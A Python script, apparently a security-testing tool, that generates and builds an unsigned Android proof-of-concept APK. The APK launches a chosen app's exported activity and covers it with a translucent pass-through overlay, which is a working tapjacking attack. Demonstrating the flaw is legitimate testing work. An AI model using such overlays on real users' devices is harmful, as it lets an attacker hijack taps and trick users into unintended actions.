import os
import subprocess
import sys
import shutil

def tapjacking_apk_builder():
    """
    Fully automated APK generation for TapJacking PoC.
    Prompts for target app details and builds an unsigned APK.
    """
    # Prompt the user for package name and activity name
    print("==== TapJacking APK Builder ====")
    package_name = input("Enter the target application package name: ")
    activity_name = input("Enter the exported activity name to test: ")
    
    # Validate inputs
    if not package_name or not activity_name:
        print("Error: Package name and activity name cannot be empty.")
        sys.exit(1)
    
    print(f"\nBuilding tapjacking APK targeting:")
    print(f"- Package: {package_name}")
    print(f"- Activity: {activity_name}")
    print("-" * 40)
    
    # Helper function
    def ensure_directory_exists(path):
        """Create directory if it doesn't exist"""
        if not os.path.exists(path):
            os.makedirs(path)

    # Setup paths
    base_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(base_dir, "Tapjacking-ExportedActivity")
    
    # Find Android SDK
    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
    if not os.path.exists(sdk_path):
        print("Error: Android SDK not found.")
        print("Please install Android Studio and the Android SDK.")
        sys.exit(1)

    # Find build tools
    build_tools_path = os.path.join(sdk_path, 'build-tools')
    if not os.path.exists(build_tools_path):
        print("Error: Android build tools not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Get latest build tools version
    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
    if not versions:
        print("Error: No build tools versions found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    latest_version = sorted(versions)[-1]
    tools_path = os.path.join(build_tools_path, latest_version)

    # Setup project structure
    print("Setting up project...")
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    
    # Create project directories
    src_dir = os.path.join(project_dir, "src")
    java_dir = os.path.join(src_dir, "com", "tapjacking", "demo")
    res_dir = os.path.join(project_dir, "res")
    
    ensure_directory_exists(java_dir)
    ensure_directory_exists(os.path.join(res_dir, "layout"))
    ensure_directory_exists(os.path.join(res_dir, "values"))
    
    # Write Android Manifest
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.tapjacking.demo">
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <application
        android:allowBackup="true"
        android:label="TapjackingDemo">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".OverlayService"
            android:enabled="true"
            android:exported="false" />
    </application>
</manifest>'''

    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest)

    # Write layout file
    layout = '''<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#80000000">
    <Button
        android:id="@+id/sampleButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="Tapjacking Running" />
</RelativeLayout>'''

    with open(os.path.join(res_dir, "layout", "overlay_layout.xml"), 'w') as f:
        f.write(layout)

    # Write strings.xml
    strings = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">TapjackingDemo</string>
</resources>'''

    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write(strings)

    # Write MainActivity.java
    main_activity = f'''
package com.tapjacking.demo;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        checkOverlayPermission();
    }}

    private void checkOverlayPermission() {{
        if (!Settings.canDrawOverlays(this)) {{
            Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())
            );
            startActivityForResult(intent, 1);
        }} else {{
            startService(new Intent(this, OverlayService.class));
            finish();
        }}
    }}

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {{
            if (Settings.canDrawOverlays(this)) {{
                startService(new Intent(this, OverlayService.class));
                finish();
            }} else {{
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
            }}
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity)

    # Write OverlayService.java
    overlay_service = f'''
package com.tapjacking.demo;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.os.Build;

@SuppressLint("ClickableViewAccessibility")
public class OverlayService extends Service {{
    private WindowManager windowManager;
    private View overlayView;

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    @Override
    public void onCreate() {{
        super.onCreate();

        Intent externalIntent = new Intent();
        externalIntent.setClassName("{package_name}", "{activity_name}");
        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(externalIntent);

        // Use Handler with Looper to avoid deprecation warnings
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
            @Override
            public void run() {{
                setupTapjackingView();
            }}
        }}, 1000);
    }}

    @SuppressLint("RtlHardcoded")
    private void setupTapjackingView() {{
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);

        int overlayType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }} else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {{
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        }} else {{
            // TYPE_SYSTEM_OVERLAY is less likely to trigger deprecation warnings on older versions
            overlayType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        }}

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.LEFT;
        windowManager.addView(overlayView, params);

        Button btn = overlayView.findViewById(R.id.sampleButton);
        btn.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                stopSelf();
            }}
        }});
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (windowManager != null && overlayView != null) {{
            windowManager.removeView(overlayView);
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "OverlayService.java"), 'w') as f:
        f.write(overlay_service)

    # Find Android Studio's JDK
    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
    if not os.path.exists(android_studio_path):
        print("Error: Android Studio not found.")
        print("Please install Android Studio in the default location.")
        sys.exit(1)

    jbr_path = os.path.join(android_studio_path, "jbr")
    if not os.path.exists(jbr_path):
        print("Error: Android Studio JDK not found.")
        print("Please ensure Android Studio is properly installed.")
        sys.exit(1)

    os.environ['JAVA_HOME'] = jbr_path

    # Build APK using Android build tools
    print("Building APK...")
    
    # 1. Compile resources
    print("Compiling resources...")
    aapt = os.path.join(tools_path, "aapt.exe")
    if not os.path.exists(aapt):
        print("Error: aapt not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    subprocess.run([aapt, "package", "-f", "-m",
                   "-J", src_dir,
                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
                  check=True)

    # 2. Compile Java files
    print("Compiling Java files...")
    javac = os.path.join(jbr_path, "bin", "javac.exe")
    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
    
    # Create classes directory
    classes_dir = os.path.join(project_dir, "classes")
    ensure_directory_exists(classes_dir)

    subprocess.run([javac,
                   "-source", "1.8",
                   "-target", "1.8",
                   "-bootclasspath", android_jar,
                   "-d", classes_dir,
                   os.path.join(java_dir, "MainActivity.java"),
                   os.path.join(java_dir, "OverlayService.java"),
                   os.path.join(src_dir, "com", "tapjacking", "demo", "R.java")],
                  check=True)

    # 3. Create JAR file
    print("Creating JAR file...")
    jar = os.path.join(jbr_path, "bin", "jar.exe")
    classes_jar = os.path.join(project_dir, "classes.jar")
    
    # Change to classes directory to create jar with correct structure
    current_dir = os.getcwd()
    os.chdir(classes_dir)
    subprocess.run([jar, "cf", classes_jar, "com"],
                  check=True)
    os.chdir(current_dir)

    # 4. Convert JAR to DEX
    print("Converting to DEX format...")
    d8 = os.path.join(tools_path, "d8.bat")
    if not os.path.exists(d8):
        print("Error: d8 not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Create output directory
    dex_output_dir = os.path.join(project_dir, "dex-output")
    ensure_directory_exists(dex_output_dir)
    
    subprocess.run([d8,
                   "--lib", android_jar,
                   "--output", dex_output_dir,
                   classes_jar],
                  check=True)
    
    # Move the classes.dex file
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), 
                os.path.join(project_dir, "classes.dex"))

    # 5. Build APK using Android Build Tools
    print("Building APK...")
    output_apk = os.path.join(base_dir, "tapjacking.apk")
    
    # Use APK Builder directly from the command line
    zip_align = os.path.join(tools_path, "zipalign.exe")
    if not os.path.exists(zip_align):
        print("Warning: zipalign not found, APK will not be optimized.")
    
    # Create a minimal APK with just the necessary components
    subprocess.run([aapt, "package", "-f", "-M", 
                   os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", android_jar,
                   "--min-sdk-version", "24",
                   "--target-sdk-version", "28",
                   "-F", output_apk],
                  check=True)
    
    # Copy DEX file to current directory for easier adding
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
    
    # Add the DEX file
    subprocess.run([aapt, "add", output_apk, "classes.dex"],
                  check=True)
    
    # Clean up
    if os.path.exists("classes.dex"):
        os.remove("classes.dex")

    # APK is unsigned at this point
    print("APK generation complete (unsigned).")
    print(f"\nBuild successful! APK generated at: {output_apk}")
    
    return output_apk

if __name__ == "__main__":
    tapjacking_apk_builder()
